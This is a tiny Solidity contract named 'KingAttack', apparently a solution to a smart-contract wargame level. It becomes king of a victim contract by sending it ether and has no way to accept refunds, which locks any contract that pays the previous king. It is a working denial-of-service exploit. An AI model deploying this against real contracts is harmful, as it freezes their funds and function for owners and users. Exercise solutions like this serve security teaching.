pragma solidity ^0.8.11;

contract KingAttack {
    function attack(address payable _victim) external payable {
        _victim.transfer(msg.value);
    }
}
